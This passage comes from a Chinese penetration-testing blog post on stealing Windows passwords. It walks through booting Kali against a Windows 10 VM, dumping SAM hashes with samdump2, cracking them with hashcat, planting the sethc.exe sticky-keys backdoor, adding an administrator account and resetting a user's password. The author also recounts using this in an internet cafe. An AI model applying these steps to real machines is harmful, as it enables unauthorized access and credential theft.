ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前 ）"></a>1. 首先将kali ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前 ）</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419184849_OuzqV7_Screenshot.jpeg" alt=""></p>
+<h4 id="2-然后启动win10就会进入kali的引导界面，我们点击Live-amd-64-即可"><a href="#2-然后启动win10就会进入kali的引导界面，我们点击Live-amd-64-即可" class="headerlink" title="2. 然后启动win10就会进入kali的引导界面，我们点击Live (amd 64) 即可"></a>2. 然后启动win10就会进入kali的引导界面，我们点击Live (amd 64) 即可</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419185050_jKbLW5_Screenshot.jpeg" alt=""></p>
+<h4 id="3-进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到-mnt-目录下，之后对-mnt目录下的操作就相当于对win10进行操作了"><a href="#3-进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到-mnt-目录下，之后对-mnt目录下的操作就相当于对win10进行操作了" class="headerlink" title="3. 进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到 /mnt 目录下，之后对/mnt目录下的操作就相当于对win10进行操作了"></a>3. 进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到 /mnt 目录下，之后对/mnt目录下的操作就相当于对win10进行操作了</h4><blockquote>
+<p>fdisk -l &amp;&amp; mount /dev/sda2 /mnt &amp;&amp; cd /mnt/ </p>
+</blockquote>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419185436_ohOVSp_Screenshot.jpeg" alt=""></p>
+<h4 id="4-挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】"><a href="#4-挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】" class="headerlink" title="4. 挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】"></a>4. 挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】</h4><blockquote>
+<p>cd /mnt/Windows/System32/config/ &amp;&amp; samdump2 SYSTEM SAM</p>
+<p>hashcat -m 1000 afc44ee7351d61d00698796da06b1ebf /usr/share/wordlists/sqlmap.txt <strong>-</strong>-force</p>
+</blockquote>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180420121521_8LVsuZ_Screenshot.jpeg" alt=""></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419190846_DSIMrd_Screenshot.jpeg" alt=""></p>
+<h4 id="5-虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，上一篇Windows-提权基础-讲漏了，这里补上"><a href="#5-虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，上一篇Windows-提权基础-讲漏了，这里补上" class="headerlink" title="5. 虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，上一篇Windows 提权基础 讲漏了，这里补上"></a>5. 虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，上一篇<a href="https://times0ng.github.io/2018/04/13/Windows-提权基础（下）/">Windows 提权基础</a> 讲漏了，这里补上</h4><blockquote>
+<p>cd /mnt/Windows/System32/</p>
+<p>cp cmd.exe sethc.exe</p>
+</blockquote>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419192009_pBbNtJ_Screenshot.jpeg" alt=""></p>
+<h4 id="6-OK-现在需要做的就是关闭kali-，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行"><a href="#6-OK-现在需要做的就是关闭kali-，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行" class="headerlink" title="6. OK 现在需要做的就是关闭kali ，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行"></a>6. OK 现在需要做的就是关闭kali ，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419193253_crhGWM_Screenshot.jpeg" alt=""></p>
+<h4 id="7-我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼"><a href="#7-我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼" class="headerlink" title="7. 我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼"></a>7. 我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼</h4><blockquote>
+<p>net user test test /add</p>
+<p>net localgroup administrators /add test</p>
+<p>logoff</p>
+</blockquote>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419195550_4l4ZGP_Screenshot.jpeg" alt=""></p>
+<h4 id="8-刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】"><a href="#8-刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】" class="headerlink" title="8. 刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】"></a>8. 刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】</h4><blockquote>
+<p>net user time0sng toor</p>
+</blockquote>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419200844_4N3J4b_Screenshot.jpeg" alt=""></p>
+<h2 id="0x06-结语"><a href="#0x06-结语" class="headerlink" title="0x06. 结语"></a>0x06. 结语</h2><h4 id="希望大家喜欢我自制的Windows系列教程，后续我将给大家带来更多更有趣的技巧！如果对上述操作步骤不是很懂或者想看一下视屏演示的读者，可以观看我自制的视屏教程，一元观看就当对笔者劳动的支持吧！大家在信安之路公众号后台回复本视频编号：-001-即可获取百度云链接和解压密码。"><a href="#希望大家喜欢我自制的Windows系列教程，后续我将给大家带来更多更有趣的技巧！如果对上述操作步骤不是很懂或者想看一下视屏演示的读者，可以观看我自制的视屏教程，一元观看就当对笔者劳动的支持吧！大家在信安之路公众号后台回复本视频编号：-001-即可获取百度云链接和解压密码。" class="headerlink" title="希望大家喜欢我自制的Windows系列教程，后续我将给大家带来更多更有趣的技巧！如果对上述操作步骤不是很懂或者想看一下视屏演示的读者，可以观看我自制的视屏教程，一元观看就当对笔者劳动的支持吧！大家在信安之路公众号后台回复本视频编号： 001 即可获取百度云链接和解压密码。"></a>希望大家喜欢我自制的Windows系列教程，后续我将给大家带来更多更有趣的技巧！如果对上述操作步骤不是很懂或者想看一下视屏演示的读者，可以观看我自制的视屏教程，一元观看就当对笔者劳动的支持吧！大家在信安之路公众号后台回复本视频编号： 001 即可获取百度云链接和解压密码。</h4>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2018/04/20/Windows密码抓取总结/">Windows密码抓取总结</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">TimeS0ng</a></p>
+        <p><span>发布时间:</span>2018-04-20, 23:39:10</p>
+        <p><span>最后更新:</span>2018-04-20, 23:39:35</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2018/04/20/Windows密码抓取总结/" title="Windows密码抓取总结">http://TimeS0ng.github.io/2018/04/20/Windows密码抓取总结/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2018/04/20/Windows密码抓取总结/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2018/04/13/Windows-提权基础（下）/">
+                    Windows 提权基础（下）
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00. 前言</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal-account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。"><span class="toc-number">1.0.1.</span> <span class="toc-text">渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-利用mimikatz获取明文密码"><span class="toc-number">2.</span> <span class="toc-text">0x01. 利用mimikatz获取明文密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#实验环境："><span class="toc-number">2.0.1.</span> <span class="toc-text">实验环境：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-windows-10-emsp-（win-10中有defender会杀掉我们的mimikatz，关掉就好）"><span class="toc-number">2.0.2.</span> <span class="toc-text">  windows 10   // （win 10中有defender会杀掉我们的mimikatz，关掉就好）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-mimikatz-trunk-emsp-download-here"><span class="toc-number">2.0.3.</span> <span class="toc-text">  mimikatz_trunk  // download here</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实验步骤："><span class="toc-number">2.0.4.</span> <span class="toc-text">实验步骤：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-首先用管理员账号运行cmd-exe，这样才能让mimikatz正常运行"><span class="toc-number">2.0.5.</span> <span class="toc-text">1. 首先用管理员账号运行cmd.exe，这样才能让mimikatz正常运行 :)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-紧接着再进入mimikatz，运行命令"><span class="toc-number">2.0.6.</span> <span class="toc-text">2. 紧接着再进入mimikatz，运行命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-此时我们就能得到username，password的密文，给大家推荐个网站-here，这里可以很容易的解密大多数密文"><span class="toc-number">2.0.7.</span> <span class="toc-text">3. 此时我们就能得到username，password的密文，给大家推荐个网站-here，这里可以很容易的解密大多数密文</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-利用procdump-amp-mimikatz获取密码"><span class="toc-number">3.</span> <span class="toc-text">0x02. 利用procdump & mimikatz获取密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#实验环境：-1"><span class="toc-number">3.0.1.</span> <span class="toc-text">实验环境：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-1-windows-7"><span class="toc-number">3.0.2.</span> <span class="toc-text">  1. windows 7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-2-procdump-emsp-download-here"><span class="toc-number">3.0.3.</span> <span class="toc-text">  2. procdump  // download here</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-3-mimikatz-trunk"><span class="toc-number">3.0.4.</span> <span class="toc-text">  3. mimikatz_trunk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实验步骤"><span class="toc-number">3.0.5.</span> <span class="toc-text">实验步骤:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-首先用procdump下载LSASS进程的内存，因为procdump是Microsoft-Sysinternals-tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd-）"><span class="toc-number">3.0.6.</span> <span class="toc-text">1. 首先用procdump下载LSASS进程的内存，因为procdump是Microsoft Sysinternals tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd ）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-接着用mimikatz打开dmp文件，获取内存中的内容-emsp-（-lsass-dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式-）"><span class="toc-number">3.0.7.</span> <span class="toc-text">2. 接着用mimikatz打开dmp文件，获取内存中的内容  // （ lsass.dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式 ）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-利用pwdump7获取密码"><span class="toc-number">4.</span> <span class="toc-text">0x03. 利用pwdump7获取密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-windows-7"><span class="toc-number">4.0.1.</span> <span class="toc-text">  windows 7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-pwdump7-emsp-download-here"><span class="toc-number">4.0.2.</span> <span class="toc-text">  pwdump7  // download here</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实验步骤：-1"><span class="toc-number">4.0.3.</span> <span class="toc-text">实验步骤：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-直接用管理员运行cmd，再运行pwdump7-exe"><span class="toc-number">4.0.4.</span> <span class="toc-text">1. 直接用管理员运行cmd，再运行pwdump7.exe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-用hashcat直接跑NTLM密码"><span class="toc-number">4.0.5.</span> <span class="toc-text">2. 用hashcat直接跑NTLM密码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-利用虚拟机文件获取密码"><span class="toc-number">5.</span> <span class="toc-text">0x04. 利用虚拟机文件获取密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：PowerMemory、quarks-pwdump-等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！"><span class="toc-number">5.0.1.</span> <span class="toc-text">关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：PowerMemory、quarks pwdump 等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#接下来我们将获取Windows-7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生-vmss-和-vmem-文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：Memoryze-、DumpIt"><span class="toc-number">5.0.2.</span> <span class="toc-text">接下来我们将获取Windows 7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生 .vmss 和 .vmem 文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：Memoryze 、DumpIt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实验环境：-2"><span class="toc-number">5.0.3.</span> <span class="toc-text">实验环境：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-windows-7-挂起状态"><span class="toc-number">5.0.4.</span> <span class="toc-text">  windows 7 挂起状态</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-Vmss2core-emsp-download-here"><span class="toc-number">5.0.5.</span> <span class="toc-text">  Vmss2core  // download here</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-Volatility-emsp-download-here"><span class="toc-number">5.0.6.</span> <span class="toc-text">  Volatility    // download here</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实验步骤：-2"><span class="toc-number">5.0.7.</span> <span class="toc-text">实验步骤：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-运行Vmss2core解析虚拟机文件，生成memory-dmp文件"><span class="toc-number">5.0.8.</span> <span class="toc-text">1. 运行Vmss2core解析虚拟机文件，生成memory.dmp文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，-profile-Win7SP1x64-架构一定要指定正确，不然会找不到地址"><span class="toc-number">5.0.9.</span> <span class="toc-text">2. 利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，--profile=Win7SP1x64 架构一定要指定正确，不然会找不到地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML-hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！"><span class="toc-number">5.0.10.</span> <span class="toc-text">3. 接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-利用kali-ISO获取密码"><span class="toc-number">6.</span> <span class="toc-text">0x05. 利用kali ISO获取密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。"><span class="toc-number">6.0.1.</span> <span class="toc-text">这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#在开始之前我们应该先准备一个USB启动盘，制作方法可以看我以前的文章，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。"><span class="toc-number">6.0.2.</span> <span class="toc-text">在开始之前我们应该先准备一个USB启动盘，制作方法可以看我以前的文章，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实验环境：-3"><span class="toc-number">6.0.3.</span> <span class="toc-text">实验环境：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-windows-10"><span class="toc-number">6.0.4.</span> <span class="toc-text">  windows 10</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-kali-ISO-emsp-download-here"><span class="toc-number">6.0.5.</span> <span class="toc-text">  kali ISO  // download here</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实验步骤：-3"><span class="toc-number">6.0.6.</span> <span class="toc-text">实验步骤：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-首先将kali-ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前-）"><span class="toc-number">6.0.7.</span> <span class="toc-text">1. 首先将kali ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前 ）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-然后启动win10就会进入kali的引导界面，我们点击Live-amd-64-即可"><span class="toc-number">6.0.8.</span> <span class="toc-text">2. 然后启动win10就会进入kali的引导界面，我们点击Live (amd 64) 即可</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到-mnt-目录下，之后对-mnt目录下的操作就相当于对win10进行操作了"><span class="toc-number">6.0.9.</span> <span class="toc-text">3. 进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到 /mnt 目录下，之后对/mnt目录下的操作就相当于对win10进行操作了</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】"><span class="toc-number">6.0.10.</span> <span class="toc-text">4. 挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，上一篇Windows-提权基础-讲漏了，这里补上"><span class="toc-number">6.0.11.</span> <span class="toc-text">5. 虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，上一篇Windows 提权基础 讲漏了，这里补上</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-OK-现在需要做的就是关闭kali-，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行"><span class="toc-number">6.0.12.</span> <span class="toc-text">6. OK 现在需要做的就是关闭kali ，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼"><span class="toc-number">6.0.13.</span> <span class="toc-text">7. 我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】"><span class="toc-number">6.0.14.</span> <span class="toc-text">8. 刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-结语"><span class="toc-number">7.</span> <span class="toc-text">0x06. 结语</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#希望大家喜欢我自制的Windows系列教程，后续我将给大家带来更多更有趣的技巧！如果对上述操作步骤不是很懂或者想看一下视屏演示的读者，可以观看我自制的视屏教程，一元观看就当对笔者劳动的支持吧！大家在信安之路公众号后台回复本视频编号：-001-即可获取百度云链接和解压密码。"><span class="toc-number">7.0.1.</span> <span class="toc-text">希望大家喜欢我自制的Windows系列教程，后续我将给大家带来更多更有趣的技巧！如果对上述操作步骤不是很懂或者想看一下视屏演示的读者，可以观看我自制的视屏教程，一元观看就当对笔者劳动的支持吧！大家在信安之路公众号后台回复本视频编号： 001 即可获取百度云链接和解压密码。</span></a></li></ol></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"Windows密码抓取总结　| TimeS0ng's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section class="youyan" id="comments">
+    <script>
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = 'http://v2.uyan.cc/code/uyan.js?uid=2142877';
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <aside class="comment-bar">
+        <a href="javascript:void(0);">
+            <i class="fa fa-commenting-o animated infinite pulse"></i>
+            <i class="fa fa-spinner fa-pulse"></i>
+            <span class="count-comment"></span>
+        </a>
+    </aside>
+    <script>
+        var $commentBar = $("#comments aside.comment-bar");
+        var load$hide = function(){
+            $commentBar.find("a > i").toggle();
+            loadComment();
+            $commentBar.fadeOut(800);
+        }
+        $commentBar.click(function(){
+            load$hide();
+        })
+        $commentBar.children("a").hover(function(){
+            load$hide();
+        })
+        if (window.location.hash === "#comments") {
+            load$hide();
+        }
+    </script>
+
+    <div id="uyan_frame"></div>
+</section>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2018/04/13/Windows-提权基础（下）/" title="下一篇: Windows 提权基础（下）">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/04/20/Windows密码抓取总结/">Windows密码抓取总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/13/Windows-提权基础（下）/">Windows 提权基础（下）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/13/Windows-提权基础（上）/">Windows 提权基础（上）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/30/kali-代理之shadowsocks-proxychains/">kali 代理之shadowsocks & proxychains</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/28/bash-伪多进程/">bash 伪多进程</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/10/Firewalk-原理/">Firewalk 原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/08/kali使用入坑指南（二）/">kali使用入坑指南（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/01/利用iodine绕过防火墙/">利用iodine绕过防火墙</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/01/kali使用入坑指南(一)/">kali使用入坑指南(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/01/kali安装KVM入坑笔记/">kali安装KVM入坑笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/花式钓鱼法/">花式钓鱼法</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/JBOSS反序列化漏洞复现/">JOBSS反序列化漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/23/RINETD 的妙用/">RINET 的妙用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/27/HTTPS攻击/">HTTPS攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/13/The-Backdoor-Factory/">The-Backdoor-Factory</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/08/Metasploit/">Metasploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/02/MITMF/">MITMF</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/02/无线渗透-序章-中间人攻击/">无线渗透(序章)--中间人攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/29/Slowhttptest/">Slowhttptest</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/TearDrop/">TearDrop</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/23/SOCKSTRESS/">SOCKSTRESS</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/21/Syn-Flood/">Syn-Flood</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/03/无线渗透(下)—企业级WPA破解/">无线渗透(下)—企业级WPA破解</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/30/无线渗透(中)--WPS破解/">无线渗透(中)--WPS破解</a></li><li class="post-list-item"><a class="post-list-link" 